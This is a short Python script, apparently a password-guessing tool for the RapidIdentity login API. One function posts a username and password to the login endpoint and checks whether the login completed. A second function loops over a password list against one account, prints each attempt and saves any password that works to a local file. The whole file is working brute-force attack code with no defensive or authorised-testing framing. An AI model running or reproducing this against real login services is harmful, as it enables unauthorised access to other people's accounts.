#RapidIdentity API funcitons

import requests

def test_creds(s, url, username, password):
    #Get id from server
    id = s.get(url).json()['id']
    #Post username and password to server
    resp = s.post(url, json={
        'id'       : id,
        'type'     : 'username+password',
        'username' : username,
        'password' : password
    }).json()
    #Check if password is valid
    valid = resp['type'] == 'complete'
    return valid

#For batch password testing
def test_list(s, url, username, password_list):
    for password in password_list:
        #Strip out newline characters
        parsed_password = password.strip("\n")
        #Check if password valid
        valid_pass = test_creds(s, url, username, parsed_password)
        if valid_pass:
            #Log to file if, by some miracle, it actually guesses it right
            with open('password', 'w') as f:
                f.write(parsed_password)
        #Print info to output
        print(username, ":","Testing", parsed_password[0:30].ljust(30), valid_pass)